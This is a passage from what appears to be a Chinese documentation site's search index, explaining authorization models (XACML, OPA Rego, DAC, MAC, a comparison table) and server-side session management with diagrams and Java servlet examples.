&lt;AttributeValue&gt;document&lt;/AttributeValue&gt;\n          &lt;ResourceAttributeDesignator AttributeId=\"resource-type\"/&gt;\n        &lt;/ResourceMatch&gt;\n      &lt;/Resource&gt;\n    &lt;/Resources&gt;\n  &lt;/Target&gt;\n\n  &lt;Rule RuleId=\"rule-01\" Effect=\"Permit\"&gt;\n    &lt;Condition&gt;\n      &lt;Apply FunctionId=\"and\"&gt;\n        &lt;Apply FunctionId=\"string-equal\"&gt;\n          &lt;AttributeValue&gt;owner&lt;/AttributeValue&gt;\n          &lt;SubjectAttributeDesignator AttributeId=\"relationship\"/&gt;\n        &lt;/Apply&gt;\n        &lt;Apply FunctionId=\"time-in-range\"&gt;\n          &lt;EnvironmentAttributeDesignator AttributeId=\"current-time\"/&gt;\n          &lt;AttributeValue&gt;09:00:00&lt;/AttributeValue&gt;\n          &lt;AttributeValue&gt;18:00:00&lt;/AttributeValue&gt;\n        &lt;/Apply&gt;\n      &lt;/Apply&gt;\n    &lt;/Condition&gt;\n  &lt;/Rule&gt;\n\n&lt;/Policy&gt;\n</code></pre></p> <p>\u73b0\u4ee3\u7b56\u7565\u8bed\u8a00\uff08OPA Rego\u98ce\u683c\uff09\uff1a <pre><code># Open Policy Agent (OPA) \u7b56\u7565\u793a\u4f8b\n\npackage document.access\n\n# \u9ed8\u8ba4\u62d2\u7edd\ndefault allow = false\n\n# \u6587\u6863\u6240\u6709\u8005\u53ef\u4ee5\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\nallow {\n    input.subject.id == input.resource.owner_id\n}\n\n# \u540c\u90e8\u95e8\u6210\u5458\u53ef\u4ee5\u8bfb\u53d6\nallow {\n    input.action == \"read\"\n    input.subject.department == input.resource.department\n}\n\n# \u7ecf\u7406\u53ef\u4ee5\u8bbf\u95ee\u4e0b\u5c5e\u521b\u5efa\u7684\u6587\u6863\nallow {\n    input.subject.role == \"manager\"\n    input.resource.owner_id in input.subject.subordinates\n}\n\n# \u5ba1\u8ba1\u5458\u53ef\u4ee5\u53ea\u8bfb\u67e5\u770b\u6240\u6709\u6587\u6863\nallow {\n    input.subject.role == \"auditor\"\n    input.action == \"read\"\n}\n\n# \u7b56\u7565\u7ec4\u5408\u793a\u4f8b\nallow {\n    # \u5de5\u4f5c\u65f6\u95f4\u9650\u5236\n    work_hours\n    # \u6765\u81ea\u516c\u53f8\u7f51\u7edc\n    company_network\n    # \u6709\u6709\u6548\u6743\u9650\n    has_permission\n}\n\nwork_hours {\n    hour := time.clock(time.now_ns())[0]\n    hour &gt;= 9\n    hour &lt; 18\n}\n\ncompany_network {\n    net.cidr_contains(\"10.0.0.0/8\", input.environment.ip)\n}\n</code></pre></p> <p>\u51b3\u7b56\u6d41\u7a0b\uff1a <pre><code>\u8bf7\u6c42 \u2192 PEP \u2192 \u63d0\u53d6\u4e0a\u4e0b\u6587 \u2192 PDP \u2192 \u52a0\u8f7d\u7b56\u7565 \u2192 \u8bc4\u4f30\u89c4\u5219 \u2192 \u51b3\u7b56\n                \u2193                        \u2191\n              PIP\uff08\u5c5e\u6027\u67e5\u8be2\uff09\u2190------------\u2518\n                \u2193\n            \u8fd4\u56de\u7ed3\u679c \u2192 PEP \u2192 \u6267\u884c/\u62d2\u7edd \u2192 \u65e5\u5fd7\u8bb0\u5f55\n</code></pre></p> <p>\u5b9e\u9645\u573a\u666f\u793a\u4f8b\uff1a</p> <pre><code>\u573a\u666f\uff1a\u4f01\u4e1a\u6587\u6863\u7ba1\u7406\u7cfb\u7edf\n\n\u7b56\u7565\u96c6\u5408\uff1a\n\n# \u57fa\u7840\u8bbf\u95ee\u7b56\u7565\npolicy \"document_owner_full_access\" {\n  effect = \"allow\"\n  resources = [\"document:*\"]\n  actions = [\"*\"]\n  condition = \"subject.id == resource.owner_id\"\n}\n\n# \u5206\u4eab\u7b56\u7565\npolicy \"shared_document_access\" {\n  effect = \"allow\"\n  resources = [\"document:*\"]\n  actions = [\"read\", \"comment\"]\n  condition = \"subject.id in resource.shared_users\"\n}\n\n# \u65f6\u95f4\u9650\u5236\u7b56\u7565\npolicy \"business_hours_only\" {\n  effect = \"deny\"\n  principals = [\"role:contractor\"]\n  resources = [\"*\"]\n  actions = [\"*\"]\n  condition = \"!is_business_hours(environment.time)\"\n}\n\n# \u5b89\u5168\u7ea7\u522b\u7b56\u7565\npolicy \"classified_document_access\" {\n  effect = \"allow\"\n  resources = [\"document:*\"]\n  actions = [\"read\"]\n  condition = \"\"\"\n    resource.classification == \"classified\" AND\n    subject.clearance_level &gt;= resource.required_clearance AND\n    subject.completed_training == true\n  \"\"\"\n}\n\n# \u5730\u7406\u9650\u5236\u7b56\u7565\npolicy \"geo_restriction\" {\n  effect = \"deny\"\n  resources = [\"document:confidential:*\"]\n  actions = [\"download\"]\n  condition = \"environment.country not in ['US', 'CN']\"\n}\n</code></pre> <p>\u4f18\u70b9\uff1a - \u2705 \u7b56\u7565\u96c6\u4e2d\u7ba1\u7406\uff0c\u7edf\u4e00\u51b3\u7b56 - \u2705 \u652f\u6301\u590d\u6742\u4e1a\u52a1\u903b\u8f91 - \u2705 \u7b56\u7565\u4e0e\u4ee3\u7801\u5206\u79bb\uff0c\u6613\u4e8e\u66f4\u65b0 - \u2705 \u53ef\u6269\u5c55\u6027\u5f3a - \u2705 \u652f\u6301\u7b56\u7565\u7248\u672c\u63a7\u5236\u548c\u5ba1\u8ba1 - \u2705 \u53ef\u4ee5\u7ec4\u5408\u591a\u79cd\u6388\u6743\u6a21\u578b</p> <p>\u7f3a\u70b9\uff1a - \u274c \u9700\u8981\u989d\u5916\u7684\u7b56\u7565\u5f15\u64ce\u57fa\u7840\u8bbe\u65bd - \u274c \u7b56\u7565\u8bed\u8a00\u5b66\u4e60\u6210\u672c - \u274c \u6027\u80fd\u5f00\u9500\uff08\u7b56\u7565\u8bc4\u4f30\uff09 - \u274c \u8c03\u8bd5\u590d\u6742\u7b56\u7565\u56f0\u96be - \u274c \u53ef\u80fd\u7684\u5355\u70b9\u6545\u969c\uff08PDP\uff09</p> <p>\u9002\u7528\u573a\u666f\uff1a - \u5fae\u670d\u52a1\u67b6\u6784\uff08\u7edf\u4e00\u6388\u6743\uff09 - \u9700\u8981\u9891\u7e41\u8c03\u6574\u6743\u9650\u89c4\u5219\u7684\u7cfb\u7edf - \u591a\u79cd\u6388\u6743\u6a21\u578b\u5171\u5b58\u7684\u573a\u666f - \u4e91\u539f\u751f\u5e94\u7528 - \u9700\u8981\u7ec6\u7c92\u5ea6\u5ba1\u8ba1\u7684\u7cfb\u7edf - \u91d1\u878d\u3001\u653f\u5e9c\u7b49\u5f3a\u76d1\u7ba1\u884c\u4e1a</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#5","title":"5. \u5176\u4ed6\u6388\u6743\u6a21\u578b","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#dac-discretionary-access-control","title":"DAC\uff08\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236 - Discretionary Access Control\uff09","text":"<p>\u6838\u5fc3\u6982\u5ff5\uff1a \u8d44\u6e90\u7684\u6240\u6709\u8005\u6709\u6743\u51b3\u5b9a\u8c01\u53ef\u4ee5\u8bbf\u95ee\u8be5\u8d44\u6e90\u3002</p> <p>\u7279\u70b9\uff1a - \u8d44\u6e90\u521b\u5efa\u8005\u81ea\u52a8\u6210\u4e3a\u6240\u6709\u8005 - \u6240\u6709\u8005\u53ef\u4ee5\u6388\u4e88/\u64a4\u9500\u4ed6\u4eba\u7684\u8bbf\u95ee\u6743\u9650 - \u6743\u9650\u53ef\u4ee5\u4f20\u9012</p> <p>\u5178\u578b\u5e94\u7528\uff1a <pre><code>\u6587\u4ef6\u7cfb\u7edf\uff1a\u7528\u6237\u53ef\u4ee5chmod/chown\u81ea\u5df1\u7684\u6587\u4ef6\n\u793e\u4ea4\u5a92\u4f53\uff1a\u7528\u6237\u8bbe\u7f6e\u5e16\u5b50\u7684\u53ef\u89c1\u8303\u56f4\uff08\u516c\u5f00/\u597d\u53cb/\u79c1\u5bc6\uff09\n\u4e91\u76d8\uff1a\u6587\u4ef6\u6240\u6709\u8005\u5206\u4eab\u7ed9\u4ed6\u4eba\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#mac-mandatory-access-control","title":"MAC\uff08\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236 - Mandatory Access Control\uff09","text":"<p>\u6838\u5fc3\u6982\u5ff5\uff1a \u7531\u7cfb\u7edf\u5f3a\u5236\u6267\u884c\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u7528\u6237\u65e0\u6cd5\u6539\u53d8\u3002\u57fa\u4e8e\u5b89\u5168\u6807\u7b7e\u548c\u5b89\u5168\u7ea7\u522b\u3002</p> <p>\u591a\u7ea7\u5b89\u5168\u6a21\u578b\uff08Bell-LaPadula\uff09\uff1a <pre><code>\u5b89\u5168\u7ea7\u522b\uff1a\u7edd\u5bc6(Top Secret) &gt; \u673a\u5bc6(Secret) &gt; \u5185\u90e8(Confidential) &gt; \u516c\u5f00(Public)\n\n\u89c4\u5219\uff1a\n- No Read Up\uff1a\u7528\u6237\u4e0d\u80fd\u8bfb\u53d6\u9ad8\u4e8e\u81ea\u5df1\u7ea7\u522b\u7684\u4fe1\u606f\n- No Write Down\uff1a\u7528\u6237\u4e0d\u80fd\u5199\u5165\u4f4e\u4e8e\u81ea\u5df1\u7ea7\u522b\u7684\u4fe1\u606f\n</code></pre></p> <p>\u5178\u578b\u5e94\u7528\uff1a <pre><code>\u519b\u4e8b\u7cfb\u7edf\uff1a\u4e25\u683c\u7684\u5206\u7ea7\u4fdd\u62a4\nSELinux\uff1aLinux\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\n\u6570\u636e\u5e93\u884c\u7ea7\u5b89\u5168\uff1a\u57fa\u4e8e\u6807\u7b7e\u7684\u5f3a\u5236\u9694\u79bb\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_4","title":"\u6388\u6743\u6a21\u578b\u5bf9\u6bd4","text":"\u7ef4\u5ea6 ACL RBAC ABAC PBAC DAC MAC \u590d\u6742\u5ea6 \u4f4e \u4e2d \u9ad8 \u9ad8 \u4f4e \u4e2d \u7075\u6d3b\u6027 \u4f4e \u4e2d \u6781\u9ad8 \u9ad8 \u4e2d \u4f4e \u7ba1\u7406\u6210\u672c \u9ad8\uff08\u8d44\u6e90\u591a\u65f6\uff09 \u4f4e \u4e2d \u4e2d \u4f4e \u4f4e \u6027\u80fd\u5f71\u54cd \u4f4e \u4f4e \u4e2d-\u9ad8 \u4e2d \u4f4e \u4f4e \u6269\u5c55\u6027 \u5dee \u826f\u597d \u4f18\u79c0 \u4f18\u79c0 \u4e00\u822c \u4e00\u822c \u7ec6\u7c92\u5ea6\u63a7\u5236 \u4f18\u79c0 \u4e00\u822c \u4f18\u79c0 \u4f18\u79c0 \u4f18\u79c0 \u4e00\u822c \u52a8\u6001\u6743\u9650 \u4e0d\u652f\u6301 \u4e0d\u652f\u6301 \u652f\u6301 \u652f\u6301 \u4e0d\u652f\u6301 \u4e0d\u652f\u6301 \u5b66\u4e60\u66f2\u7ebf \u5e73\u7f13 \u5e73\u7f13 \u9661\u5ced \u9661\u5ced \u5e73\u7f13 \u4e2d\u7b49 \u5ba1\u8ba1\u80fd\u529b \u4e00\u822c \u826f\u597d \u4f18\u79c0 \u4f18\u79c0 \u4e00\u822c \u4f18\u79c0 \u5178\u578b\u573a\u666f \u6587\u4ef6\u7cfb\u7edf \u4f01\u4e1a\u5e94\u7528 \u4e91\u5e73\u53f0 \u5fae\u670d\u52a1 \u4e2a\u4eba\u6587\u4ef6 \u519b\u4e8b\u7cfb\u7edf \u9002\u7528\u89c4\u6a21 \u5c0f\u578b \u4e2d\u5927\u578b \u5927\u578b \u5927\u578b \u5c0f\u578b \u4e2d\u578b <p>\u9009\u62e9\u5efa\u8bae\uff1a</p> <pre><code>\u573a\u666f\u9a71\u52a8\u9009\u62e9\uff1a\n\n1. \u5c0f\u578b\u5e94\u7528\u3001\u539f\u578b\u7cfb\u7edf\n   \u2192 ACL\uff08\u7b80\u5355\u591f\u7528\uff09\n\n2. \u4f01\u4e1a\u5185\u90e8\u7cfb\u7edf\u3001SaaS\u4ea7\u54c1\n   \u2192 RBAC\uff08\u6210\u719f\u7a33\u5b9a\uff09\n\n3. \u590d\u6742\u6743\u9650\u3001\u8de8\u7ec4\u7ec7\u534f\u4f5c\n   \u2192 ABAC\uff08\u7075\u6d3b\u5f3a\u5927\uff09\n\n4. \u5fae\u670d\u52a1\u3001\u4e91\u539f\u751f\u3001\u591a\u6a21\u578b\u7ec4\u5408\n   \u2192 PBAC\uff08\u7edf\u4e00\u51b3\u7b56\uff09\n\n5. \u4e2a\u4eba\u6587\u4ef6\u3001\u7528\u6237\u751f\u6210\u5185\u5bb9\n   \u2192 DAC\uff08\u7528\u6237\u81ea\u4e3b\uff09\n\n6. \u9ad8\u5b89\u5168\u8981\u6c42\u3001\u519b\u4e8b/\u653f\u5e9c\n   \u2192 MAC\uff08\u5f3a\u5236\u4fdd\u62a4\uff09\n\n\u6df7\u5408\u4f7f\u7528\uff1a\n\u5b9e\u9645\u7cfb\u7edf\u5e38\u5e38\u7ec4\u5408\u591a\u79cd\u6a21\u578b\n\u4f8b\u5982\uff1aRBAC\uff08\u57fa\u7840\u6743\u9650\uff09+ ABAC\uff08\u52a8\u6001\u89c4\u5219\uff09+ ACL\uff08\u7279\u6b8a\u8d44\u6e90\uff09\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_5","title":"\u8ba4\u8bc1\u4e0e\u6388\u6743\u7684\u533a\u522b","text":"\u7ef4\u5ea6 \u8ba4\u8bc1\uff08Authentication\uff09 \u6388\u6743\uff08Authorization\uff09 \u6838\u5fc3\u95ee\u9898 \u4f60\u662f\u8c01\uff1f \u4f60\u80fd\u505a\u4ec0\u4e48\uff1f \u76ee\u7684 \u9a8c\u8bc1\u8eab\u4efd \u63a7\u5236\u8bbf\u95ee \u65f6\u673a \u9996\u5148\u6267\u884c \u8ba4\u8bc1\u6210\u529f\u540e\u6267\u884c \u8f93\u5165 \u7528\u6237\u540d+\u5bc6\u7801/\u4ee4\u724c \u7528\u6237\u8eab\u4efd+\u8bf7\u6c42\u8d44\u6e90 \u8f93\u51fa \u8eab\u4efd\u786e\u8ba4\uff08\u662f/\u5426\uff09 \u8bbf\u95ee\u51b3\u7b56\uff08\u5141\u8bb8/\u62d2\u7edd\uff09 \u5b9e\u73b0\u65b9\u5f0f \u767b\u5f55\u3001SSO\u3001OAuth RBAC\u3001ACL\u3001\u7b56\u7565\u5f15\u64ce HTTP\u72b6\u6001\u7801 401 Unauthorized 403 Forbidden <p>\u5b9e\u9645\u6d41\u7a0b\u793a\u4f8b\uff1a <pre><code>1. \u7528\u6237\u8bbf\u95ee\u53d7\u4fdd\u62a4\u8d44\u6e90\n2. \u7cfb\u7edf\u68c0\u67e5\u662f\u5426\u5df2\u8ba4\u8bc1 \u2192 \u672a\u8ba4\u8bc1 \u2192 \u8df3\u8f6c\u767b\u5f55\u9875\uff08\u8ba4\u8bc1\uff09\n3. \u7528\u6237\u8f93\u5165\u7528\u6237\u540d+\u5bc6\u7801\n4. \u7cfb\u7edf\u9a8c\u8bc1\u51ed\u8bc1 \u2192 \u8ba4\u8bc1\u6210\u529f \u2192 \u5efa\u7acb\u4f1a\u8bdd\n5. \u7cfb\u7edf\u68c0\u67e5\u7528\u6237\u6743\u9650 \u2192 \u68c0\u67e5\u6388\u6743\u7b56\u7565\uff08\u6388\u6743\uff09\n6. \u6388\u6743\u901a\u8fc7 \u2192 \u8fd4\u56de\u8d44\u6e90 | \u6388\u6743\u5931\u8d25 \u2192 \u8fd4\u56de403\u9519\u8bef\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#session-management","title":"\u4f1a\u8bdd\u7ba1\u7406\uff08Session Management\uff09","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#why-session","title":"\u4e3a\u4ec0\u4e48\u9700\u8981\u4f1a\u8bdd\uff1f\uff08Why Session\uff1f\uff09","text":"<p>HTTP\u662f**\u65e0\u72b6\u6001\u534f\u8bae**\uff08Stateless Protocol\uff09\uff0c\u8fd9\u610f\u5473\u7740\uff1a - \u670d\u52a1\u5668\u65e0\u6cd5\u8bc6\u522b\u4e24\u6b21\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u540c\u4e00\u7528\u6237 - \u6bcf\u4e2a\u8bf7\u6c42\u90fd\u662f\u72ec\u7acb\u7684\uff0c\u670d\u52a1\u5668\u5904\u7406\u5b8c\u5c31\"\u5fd8\u8bb0\"\u4e86 - \u65e0\u6cd5\u7ef4\u62a4\u7528\u6237\u7684\u767b\u5f55\u72b6\u6001\u548c\u4e0a\u4e0b\u6587\u4fe1\u606f</p> <p>**\u4f1a\u8bdd\u7ba1\u7406**\u901a\u8fc7\u5728\u591a\u4e2a\u8bf7\u6c42\u95f4\u7ef4\u62a4\u7528\u6237\u72b6\u6001\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u8ba9\u670d\u52a1\u5668\u80fd\u591f\"\u8bb0\u4f4f\"\u7528\u6237\u3002</p> <p>\u5178\u578b\u573a\u666f\uff1a <pre><code>\u573a\u666f\uff1a\u7528\u6237\u6d4f\u89c8\u7535\u5546\u7f51\u7ad9\n\n1. \u7528\u6237\u767b\u5f55 \u2192 \u670d\u52a1\u5668\u9700\u8981\u8bb0\u4f4f\"\u8fd9\u4e2a\u7528\u6237\u5df2\u767b\u5f55\"\n2. \u6d4f\u89c8\u5546\u54c1 \u2192 \u670d\u52a1\u5668\u9700\u8981\u77e5\u9053\"\u8fd9\u662f\u4e4b\u524d\u767b\u5f55\u7684\u90a3\u4e2a\u7528\u6237\"\n3. \u52a0\u5165\u8d2d\u7269\u8f66 \u2192 \u9700\u8981\u628a\u5546\u54c1\u5173\u8054\u5230\"\u8fd9\u4e2a\u7528\u6237\u7684\u8d2d\u7269\u8f66\"\n4. \u7ed3\u7b97\u4ed8\u6b3e \u2192 \u9700\u8981\u786e\u8ba4\"\u8fd9\u662f\u540c\u4e00\u4e2a\u767b\u5f55\u7528\u6237\"\n\n\u6ca1\u6709\u4f1a\u8bdd\u7ba1\u7406\uff0c\u6bcf\u6b21\u8bf7\u6c42\u90fd\u9700\u8981\u91cd\u65b0\u767b\u5f55\uff01\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#1-session","title":"1. \u57fa\u4e8e\u670d\u52a1\u5668\u7684\u4f1a\u8bdd\uff08Session\uff09","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#11-sessionwhat","title":"1.1 Session\u6838\u5fc3\u6982\u5ff5\uff08What\uff09","text":"<p>**Session**\u662f\u670d\u52a1\u5668\u7aef\u5b58\u50a8\u7684\u7528\u6237\u4f1a\u8bdd\u6570\u636e\uff0c\u901a\u8fc7**SessionID**\u4e0e\u5ba2\u6237\u7aef\u5173\u8054\u3002</p> <p>\u6838\u5fc3\u7ec4\u6210\uff1a <pre><code>Session = SessionID + SessionData\n\nSessionID\uff08\u4f1a\u8bdd\u6807\u8bc6\uff09\uff1a\n- \u552f\u4e00\u6807\u8bc6\u4e00\u4e2a\u4f1a\u8bdd\n- \u901a\u5e38\u662f\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\n- \u793a\u4f8b\uff1a3F2504E0-4F89-41D3-9A0C-0305E82C3301\n\nSessionData\uff08\u4f1a\u8bdd\u6570\u636e\uff09\uff1a\n- \u7528\u6237\u4fe1\u606f\uff1auserId, username, roles\n- \u4e1a\u52a1\u6570\u636e\uff1a\u8d2d\u7269\u8f66\u3001\u6d4f\u89c8\u5386\u53f2\n- \u72b6\u6001\u4fe1\u606f\uff1a\u767b\u5f55\u65f6\u95f4\u3001\u6700\u540e\u6d3b\u52a8\u65f6\u95f4\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#12-sessionhow","title":"1.2 Session\u5de5\u4f5c\u539f\u7406\uff08How\uff09","text":"<p>\u5b8c\u6574\u6d41\u7a0b\uff1a <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  \u5ba2\u6237\u7aef  \u2502                                    \u2502  \u670d\u52a1\u5668  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518                                    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n     \u2502                                              \u2502\n     \u2502  1. POST /login                             \u2502\n     \u2502     username=zhang&amp;password=***             \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                              \u2502\n     \u2502                                              \u2502  2. \u9a8c\u8bc1\u51ed\u8bc1\n     \u2502                                              \u2502  3. \u521b\u5efaSession\u5bf9\u8c61\n     \u2502                                              \u2502     session = {\n     \u2502                                              \u2502       userId: 1001,\n     \u2502                                              \u2502       username: \"zhang\",\n     \u2502                                              \u2502       loginTime: \"2024-...\"\n     \u2502                                              \u2502     }\n     \u2502                                              \u2502  4. \u751f\u6210SessionID\n     \u2502                                              \u2502     sessionId = UUID.random()\n     \u2502                                              \u2502  5. \u5b58\u50a8Session\n     \u2502                                              \u2502     storage.put(sessionId, session)\n     \u2502                                              \u2502\n     \u2502  6. \u8fd4\u56de\u54cd\u5e94 + Set-Cookie                    \u2502\n     \u2502     Set-Cookie: JSESSIONID=abc123; HttpOnly \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                              \u2502\n     \u2502  7. \u6d4f\u89c8\u5668\u4fdd\u5b58Cookie                         \u2502\n     \u2502     Cookie: JSESSIONID=abc123               \u2502\n     \u2502                                              \u2502\n     \u2502  8. GET /api/profile                        \u2502\n     \u2502     Cookie: JSESSIONID=abc123               \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                                              \u2502\n     \u2502                                              \u2502  9. \u63d0\u53d6SessionID\n     \u2502                                              \u2502  10. \u67e5\u627eSession\n     \u2502                                              \u2502      session = storage.get(\"abc123\")\n     \u2502                                              \u2502  11. \u9a8c\u8bc1Session\u6709\u6548\u6027\n     \u2502                                              \u2502  12. \u83b7\u53d6\u7528\u6237\u4fe1\u606f\n     \u2502                                              \u2502\n     \u2502  13. \u8fd4\u56de\u7528\u6237\u6570\u636e                            \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                                              \u2502\n</code></pre></p> <p>\u5173\u952e\u6b65\u9aa4\u8bf4\u660e\uff1a</p> <ol> <li> <p>Session\u521b\u5efa <pre><code>\u7528\u6237\u767b\u5f55\u6210\u529f\u540e\uff1a\n- \u751f\u6210\u552f\u4e00\u7684SessionID\uff08\u901a\u5e38\u4f7f\u7528UUID\u6216\u5b89\u5168\u968f\u673a\u6570\uff09\n- \u521b\u5efaSession\u5bf9\u8c61\uff0c\u5b58\u50a8\u7528\u6237\u4fe1\u606f\n- \u5c06Session\u5bf9\u8c61\u4fdd\u5b58\u5230\u5b58\u50a8\u4ecb\u8d28\uff08\u5185\u5b58/Redis/\u6570\u636e\u5e93\uff09\n</code></pre></p> </li> <li> <p>SessionID\u4f20\u9012 <pre><code>\u65b9\u5f0f1\uff1aCookie\uff08\u6700\u5e38\u7528\uff09\nSet-Cookie: JSESSIONID=abc123; Path=/; HttpOnly; Secure; SameSite=Strict\n\n\u65b9\u5f0f2\uff1aURL\u91cd\u5199\uff08\u4e0d\u63a8\u8350\uff0c\u5b89\u5168\u6027\u5dee\uff09\nhttp://example.com/page;jsessionid=abc123\n\n\u65b9\u5f0f3\uff1aHTTP Header\uff08\u9002\u7528\u4e8eAPI\uff09\nX-Session-ID: abc123\n</code></pre></p> </li> <li> <p>Session\u67e5\u627e <pre><code>\u6bcf\u6b21\u8bf7\u6c42\uff1a\n1. \u4eceCookie/Header\u4e2d\u63d0\u53d6SessionID\n2. \u4f7f\u7528SessionID\u4ece\u5b58\u50a8\u4e2d\u67e5\u627eSession\u5bf9\u8c61\n3. \u9a8c\u8bc1Session\u662f\u5426\u8fc7\u671f\n4. \u66f4\u65b0\u6700\u540e\u8bbf\u95ee\u65f6\u95f4\uff08\u5982\u679c\u9700\u8981\u6ed1\u52a8\u8fc7\u671f\uff09\n</code></pre></p> </li> </ol>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#13-sessiontoken","title":"1.3 \u5e38\u89c1\u7591\u95ee\uff1a\u672a\u767b\u5f55\u65f6\u662f\u5426\u751f\u6210Session/Token\uff1f","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u6982\u5ff5\u533a\u5206\u70b9\uff0c\u76f4\u63a5\u5f71\u54cd\u5230\u7cfb\u7edf\u7684\u8bbe\u8ba1\u548c\u5b9e\u73b0\u3002</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#session","title":"Session\u7684\u60c5\u51b5","text":"<p>\u7b54\u6848\uff1a\u53d6\u51b3\u4e8e\u6846\u67b6\u914d\u7f6e\uff0c\u901a\u5e38\u6709\u4e24\u79cd\u60c5\u51b5</p> <p>\u60c5\u51b51\uff1a\u81ea\u52a8\u521b\u5efa\u533f\u540dSession\uff08\u9ed8\u8ba4\u884c\u4e3a\uff09</p> <pre><code>// \u7528\u6237\u7b2c\u4e00\u6b21\u8bbf\u95ee\u7f51\u7ad9\uff08\u672a\u767b\u5f55\uff09\nGET /homepage\n\n// Servlet\u5bb9\u5668\u81ea\u52a8\u521b\u5efa\u533f\u540dSession\nHttpSession session = request.getSession();  // \u9ed8\u8ba4true\uff0c\u4f1a\u81ea\u52a8\u521b\u5efa\n// \u751f\u6210SessionID: abc123\n// \u4f46Session\u5185\u5bb9\u662f\u7a7a\u7684\uff0c\u6ca1\u6709\u7528\u6237\u4fe1\u606f\n\n// \u54cd\u5e94\nSet-Cookie: JSESSIONID=abc123; Path=/; HttpOnly\n</code></pre> <p>\u7279\u70b9\uff1a - \u2705 \u7528\u4e8e\u8ddf\u8e2a\u533f\u540d\u7528\u6237\uff08\u6d4f\u89c8\u5386\u53f2\u3001\u8d2d\u7269\u8f66\u7b49\uff09 - \u2705 Session\u5b58\u5728\uff0c\u4f46\u6ca1\u6709\u7528\u6237\u8eab\u4efd\u4fe1\u606f - \u2705 \u53ef\u4ee5\u5b58\u50a8\u4e34\u65f6\u6570\u636e\uff08\u5982\uff1a\u672a\u767b\u5f55\u65f6\u7684\u8d2d\u7269\u8f66\uff09 - \u26a0\ufe0f  \u5360\u7528\u670d\u52a1\u5668\u8d44\u6e90\uff08\u5373\u4f7f\u7528\u6237\u672a\u767b\u5f55\uff09</p> <p>\u60c5\u51b52\uff1a\u61d2\u521b\u5efaSession\uff08\u6309\u9700\u521b\u5efa\uff09</p> <pre><code>// \u7b2c\u4e00\u6b21\u8bbf\u95ee\uff08\u672a\u767b\u5f55\uff09\nHttpSession session = request.getSession(false);  // false\u8868\u793a\u4e0d\u81ea\u52a8\u521b\u5efa\n// session == null\n\n// \u53ea\u5728\u767b\u5f55\u6210\u529f\u540e\u521b\u5efaSession\npublic void onLoginSuccess(User user) {\n    HttpSession session = request.getSession(true);  // true\u8868\u793a\u521b\u5efa\n    session.setAttribute(\"user\", user);\n}\n</code></pre> <p>\u5b9e\u9645\u5e94\u7528\u793a\u4f8b\uff1a\u7535\u5546\u7f51\u7ad9</p> 